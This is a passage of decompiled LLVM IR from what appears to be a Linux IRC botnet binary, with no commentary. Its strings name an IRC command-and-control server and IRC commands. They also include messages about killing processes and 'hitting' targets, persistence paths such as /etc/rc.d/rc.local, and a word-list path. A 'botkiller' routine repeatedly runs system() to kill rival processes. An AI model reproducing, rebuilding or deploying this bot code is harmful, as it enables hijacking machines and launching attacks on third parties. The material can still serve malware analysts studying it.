x i8], [11 x i8]* @global_var_8050dee.136, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050df9.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e02.138, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050e0b.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050e13.140, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8050e1e.141, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050e2e.142, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8050e36.143, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050e3e.144, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8050e47.145, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050e51.146, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050e5d.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050e6b.148, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050e79.149, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050e86.150, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050e94.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050e9f.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050eaa.153, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8050eb7.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050ec6.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050ed3.156, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050ee0.157, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8050eec.158, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_8050efb.159, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050f0f.160, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8050f1b.161, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8050f27.162, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8050f34.163, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f42.164, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80509f0.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8050f4b.165, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f54.166, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f59.167, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f5e.168, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f63.169, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f68.170, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f6d.171, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f72.172, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f77.173, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8050f7c.174, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050f81.175, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050f87.176, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050f8d.177, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050f93.178, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050f99.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050f9f.180, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050fa5.181, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050fab.182, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050fb1.183, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050fb7.184, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8050fbd.185, i32 0, i32 0), i8* bitcast (i32* @global_var_8050fc3.186 to i8*), i8* bitcast (i32* @global_var_8050fc5.187 to i8*), i8* bitcast (i32* @global_var_8050fc7.188 to i8*), i8* bitcast (i32* @global_var_8050fc9.189 to i8*), i8* bitcast (i32* @global_var_8050fcb.190 to i8*), i8* bitcast (i32* @global_var_8050fcd.191 to i8*), i8* bitcast (i32* @global_var_8050fcf.192 to i8*), i8* bitcast (i32* @global_var_8050fd1.193 to i8*), i8* bitcast (i32* @global_var_8050fd3.194 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fd5.195, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fd8.196, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fdb.197, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fde.198, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fe1.199, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fe4.200, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fe7.201, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fea.202, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050fed.203, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050ff0.204, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050ff3.205, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050ff6.206, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8050ff9.207, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051004.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8051009.209, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805100f.210, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051014.211, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051017.212, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805101a.213, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805101d.214, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051020.215, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051023.216, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051026.217, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8051029.218, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805102c.219, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805102f.220, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051033.221, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051037.222, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805103b.223, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805103f.224, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051043.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8051047.226, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805104b.227, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805104f.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051053.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805105c.230, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051061.231, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8051066.232, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805106b.233, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8051071.234, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051078.235, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051080.236, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051088.237, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8051090.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8051099.239, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80510a1.240, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80510a8.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80510b1.242, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80510b9.243, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80510be.244, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80510c5.245, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80510cc.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80510d3.247, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80510da.248, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80510e0.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80510e9.250, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80510ef.251, i32 0, i32 0)]
@global_var_80547a0.254 = global i32 0
@global_var_8054390.256 = local_unnamed_addr global i32 0
@global_var_8056a2c.257 = local_unnamed_addr global i32 0
@global_var_8051110.258 = constant i32 1966014578
@global_var_8051112.259 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_8056a08.260 = local_unnamed_addr global i32 0
@global_var_8051122.261 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_805113b.262 = constant [4 x i8] c"std\00"
@global_var_8056a28.263 = local_unnamed_addr global i32 0
@global_var_805113f.264 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_805115c.265 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_805110a.266 = constant [6 x i8] c"pices\00"
@global_var_8054024.267 = local_unnamed_addr global [6 x i8]* @global_var_805110a.266
@global_var_8056a10.268 = local_unnamed_addr global i32 0
@global_var_80511be.269 = constant i32 1330446336
@global_var_805117a.270 = constant [4 x i8] c"STD\00"
@global_var_8054040.271 = local_unnamed_addr global [4 x i8]* @global_var_805117a.270
@global_var_8054044.272 = local_unnamed_addr global i32 134514970
@global_var_80511c0.273 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_8056a24.274 = local_unnamed_addr global i32 0
@global_var_80511cf.275 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_80511dc.276 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_80511e4.277 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_805438c.278 = local_unnamed_addr global i32 0
@global_var_80511ed.283 = constant [14 x i8] c"[linux][i586]\00"
@global_var_8056a14.284 = local_unnamed_addr global i32 0
@global_var_8054380.285 = local_unnamed_addr global i32 0
@global_var_80510f4.287 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_805401c.288 = global [22 x i8]* @global_var_80510f4.287
@global_var_8056a1c.289 = local_unnamed_addr global i32 0
@global_var_8051218.290 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_805122b.291 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_805123a.293 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_8051242.294 = constant i32 1966014561
@global_var_8051244.295 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_8056a18.296 = local_unnamed_addr global i32 0
@global_var_8051252.297 = constant i32 1342177315
@global_var_8051254.298 = constant i32 1396789248
@global_var_8056a0c.299 = local_unnamed_addr global i32 0
@global_var_8051255.300 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_8051260.301 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_8051289.302 = constant i32 1380253706
@global_var_80511fb.303 = constant [4 x i8] c"352\00"
@global_var_8054080.304 = global [4 x i8]* @global_var_80511fb.303
@global_var_8054084.305 = global i32 134516887
@global_var_805128b.306 = constant [6 x i8] c"ERROR\00"
@global_var_80569d0.307 = local_unnamed_addr global i32 0
@global_var_8054120.309 = global i32 288
@global_var_8054170.310 = local_unnamed_addr global i32 272
@global_var_80569e0.312 = global i32 0
@global_var_80540f0.313 = global i32 0
@global_var_80547a4.314 = local_unnamed_addr global i32 0
@global_var_80547a8.315 = local_unnamed_addr global i32 0
@global_var_8054108.316 = local_unnamed_addr global i32 2
@global_var_80540d8.317 = global i32 0
@global_var_80540d4.318 = global i32* @global_var_8054120.309
@global_var_80515a0.319 = constant i32 0
@global_var_80515b8.320 = constant [6 x i8] c"(nil)\00"
@global_var_80515be.321 = constant [7 x i8] c"(null)\00"
@global_var_80515c5.322 = constant i32 2949163
@global_var_8051632.324 = constant i32 327688
@global_var_8054320 = external local_unnamed_addr global i32
@global_var_8052880.326 = constant i32 65536
@global_var_805162a.327 = constant [8 x i8] c" +0-#'I\00"
@global_var_80515d8.328 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_8051615.329 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805160b.330 = constant i32 117506048
@global_var_80515fc.331 = constant i32 331776
@global_var_8051680.332 = constant [8 x i8] c"Success\00"
@global_var_8051656.333 = constant [15 x i8] c"Unknown error \00"
@global_var_8054328.334 = local_unnamed_addr global i32* @global_var_8052880.326
@global_var_80567c0.335 = global i32 0
@global_var_80567e0.336 = global i32 0
@global_var_80569ac.337 = global i32 0
@global_var_8054330.338 = global i32 0
@global_var_8056dd4.339 = local_unnamed_addr global i32 0
@global_var_8056dc8.340 = global i32 0
@global_var_8054210.341 = global i32 0
@global_var_8056a6c.343 = global i32 0
@global_var_8056a70.344 = local_unnamed_addr global i32 0
@global_var_8056a74.345 = global i32 0
@global_var_8056a80.346 = local_unnamed_addr global i32 0
@global_var_8056d74.347 = global i32 0
@global_var_8056d9c.348 = local_unnamed_addr global i32 0
@global_var_8056d8c.349 = local_unnamed_addr global i32 0
@global_var_8056d90.350 = local_unnamed_addr global i32 0
@global_var_8056d94.351 = local_unnamed_addr global i32 0
@global_var_8056d98.352 = local_unnamed_addr global i32 0
@global_var_8056da4.353 = local_unnamed_addr global i32 0
@global_var_8056db0.354 = local_unnamed_addr global i32 0
@global_var_8056da8.355 = local_unnamed_addr global i32 0
@global_var_8056db4.356 = local_unnamed_addr global i32 0
@global_var_8056d88.357 = local_unnamed_addr global i32 0
@global_var_8056d84.359 = local_unnamed_addr global i32 0
@global_var_8056dac.360 = local_unnamed_addr global i32 0
@global_var_8056a7c.361 = local_unnamed_addr global i32 0
@global_var_8054228.362 = global i32 0
@global_var_8054240.364 = global i32 0
@global_var_8054258 = external global i32
@global_var_8054284.366 = global i32 -1726662223
@global_var_8054260.367 = local_unnamed_addr global i32* @global_var_8054284.366
@global_var_805425c.368 = global i32* @global_var_8054284.366
@global_var_80521f4.369 = constant i32 0
@global_var_80521e0.370 = constant i32 0
@global_var_8052208.371 = constant [3 x i8] c"-c\00"
@global_var_8052210.372 = constant [3 x i8] c"sh\00"
@global_var_805220b.373 = constant [8 x i8] c"/bin/sh\00"
@global_var_8054300.374 = global i32 0
@global_var_80569c4.375 = local_unnamed_addr global i32 0
@global_var_80569cc.376 = local_unnamed_addr global i32 0
@global_var_8053be8.378 = global i32 -1
@global_var_804d707.379 = constant i32 -294069
@global_var_80569d4.380 = local_unnamed_addr global i32 0
@global_var_80569d8.381 = local_unnamed_addr global i32 0
@global_var_805246c.382 = constant [10 x i8] c"/dev/null\00"
@global_var_80569c8.384 = local_unnamed_addr global i32 0
@global_var_804d8ed.386 = constant i32 1928542531
@global_var_804d911.387 = constant i32 1928542531
@global_var_8056a04.388 = local_unnamed_addr global i32 0
@global_var_80569e4.389 = global i32 0
@global_var_8052a90.391 = constant [4 x i8] c"inf\00"
@global_var_8052a93.396 = constant i32 1179535616
@global_var_8052aa0.397 = constant i32 2883630
@global_var_8056dd8.401 = local_unnamed_addr global i32 0
@global_var_8052b5c.402 = constant i32 1697579054
@global_var_8052b90.403 = constant i32 1868824690
@global_var_8052b5e.404 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_8052b6f.405 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_8052b87.406 = constant [11 x i8] c"nameserver\00"
@global_var_8052b92.407 = constant [7 x i8] c"domain\00"
@global_var_8052b99.408 = constant [7 x i8] c"search\00"
@global_var_8056db8.409 = global i32 0
@global_var_8056de0.410 = global i32 0
@global_var_8056e60.411 = local_unnamed_addr global i32 0
@global_var_8056e64.412 = local_unnamed_addr global i32 0
@global_var_8052bb4.413 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_8052bb1.415 = constant [3 x i8] c"%x\00"
@global_var_8052bc5.416 = constant [11 x i8] c"/etc/hosts\00"
@global_var_8052bd0.417 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_8054360.1 = local_unnamed_addr global i8 0
@global_var_80543a0.253 = external global i8*
@global_var_8054384.255 = local_unnamed_addr global i8 0
@global_var_8054388.279 = external global i8*
@global_var_805438b.280 = external local_unnamed_addr global i8*
@global_var_805438a.281 = external local_unnamed_addr global i8*
@global_var_8054389.282 = external global i8*
@global_var_8054018.286 = local_unnamed_addr global i64 577886767345041409
@1 = internal constant [2 x i8] c"/\00"
@global_var_8051238.292 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_805164a.323 = external constant i8*
@global_var_8056a40.342 = global i8 0
@global_var_8056da0.358 = local_unnamed_addr global i8 0
@global_var_80569c0.363 = local_unnamed_addr global i8 0
@global_var_80569dc.383 = local_unnamed_addr global i8 0
@global_var_80569e8.398 = external global i8*
@global_var_8056a00.399 = local_unnamed_addr global i64 0
@global_var_805432c.400 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 47967
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_8054360.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8053c24.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8053c24.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8053c24.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8054360.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053c24.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8054360.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_8052be4.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_8053bf8.6, align 8
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134518098, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134547800, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804819a = ptrtoint i32* %stack_var_-88 to i32
  %v2_80481c2 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804818e

dec_label_pc_804818e:                             ; preds = %dec_label_pc_8048226, %entry
  br label %dec_label_pc_804819a

dec_label_pc_804819a:                             ; preds = %dec_label_pc_804818e, %dec_label_pc_804819a
  %storemerge116 = phi i32 [ 0, %dec_label_pc_804818e ], [ %v4_8048219, %dec_label_pc_804819a ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_80481b3 = mul nuw nsw i32 %storemerge116, 4
  %v2_80481b3 = add i32 %v1_80481b3, ptrtoint ([246 x i8*]* @global_var_8053c40.252 to i32)
  %v3_80481b3 = inttoptr i32 %v2_80481b3 to i32*
  %v4_80481b3 = load i32, i32* %v3_80481b3, align 4
  %v3_80481c2 = call i32 @strcat(i8* %v2_80481c2, i32 %v4_80481b3)
  %v1_80481d1 = call i32 @__libc_system(i32 %v2_804819a)
  store i32 1819044203, i32* %stack_var_-88, align 4
  %v4_80481f3 = load i32, i32* %v3_80481b3, align 4
  %v3_8048202 = call i32 @strcat(i8* %v2_80481c2, i32 %v4_80481f3)
  %v1_8048211 = call i32 @__libc_system(i32 %v2_804819a)
  %v4_8048219 = add nuw nsw i32 %storemerge116, 1
  %exitcond = icmp eq i32 %v4_8048219, 9
  br i1 %exitcond, label %dec_label_pc_8048226, label %dec_label_pc_804819a

dec_label_pc_8048226:                             ; preds = %dec_label_pc_804819a
  %v1_804822b = call i32 @sleep(i32 5)
  br label %dec_label_pc_804818e

; uselistorder directives
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder label %dec_label_pc_804819a, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_804823b = load i32, i32* @ebx, align 4
  store i32 %v0_804823b, i32* %stack_var_-8, align 4
  %v4_804823f = ptrtoint i8* %arg1 to i32
  %v2_8048242 = load i8, i8* %arg1, align 1
  %v12_804824e = icmp eq i8 %v2_8048242, 42
  br i1 %v12_804824e, label %dec_label_pc_8048279, label %dec_label_pc_8048254

dec_label_pc_8048254:                             ; preds = %entry
  %v12_8048254 = icmp eq i8 %v2_8048242, 63
  br i1 %v12_8048254, label %dec_label_pc_80482cb, label %dec_label_pc_804825a

dec_label_pc_804825a:                             ; preds = %dec_label_pc_8048254
  %v4_804825a = icmp eq i8 %v2_8048242, 0
  br i1 %v4_804825a, label %dec_label_pc_8048265, label %dec_label_pc_8048305

dec_label_pc_8048265:                             ; preds = %dec_label_pc_804825a
  %v2_8048268 = load i8, i8* %tmp14, align 1
  %v3_8048268 = zext i8 %v2_8048268 to i32
  br label %dec_label_pc_8048366

dec_label_pc_8048279:                             ; preds = %entry
  %v1_804827c = add i32 %v4_804823f, 1
  %v5_8048283 = inttoptr i32 %v1_804827c to i8*
  %v5_8048284 = call i32 @strwildmatch(i8* %v5_8048283, i32 %arg2)
  %v1_804828c = icmp eq i32 %v5_8048284, 0
  br i1 %v1_804828c, label %dec_label_pc_80482b9, label %dec_label_pc_8048290

dec_label_pc_8048290:                             ; preds = %dec_label_pc_8048279
  %v2_8048293 = load i8, i8* %tmp14, align 1
  %v4_8048295 = icmp eq i8 %v2_8048293, 0
  br i1 %v4_8048295, label %dec_label_pc_80482c0, label %dec_label_pc_8048299

dec_label_pc_8048299:                             ; preds = %dec_label_pc_8048290
  %v1_804829c = add i32 %arg2, 1
  %v5_80482a4 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_804829c)
  %v1_80482ac = icmp eq i32 %v5_80482a4, 0
  br i1 %v1_80482ac, label %dec_label_pc_80482b9, label %dec_label_pc_80482c0

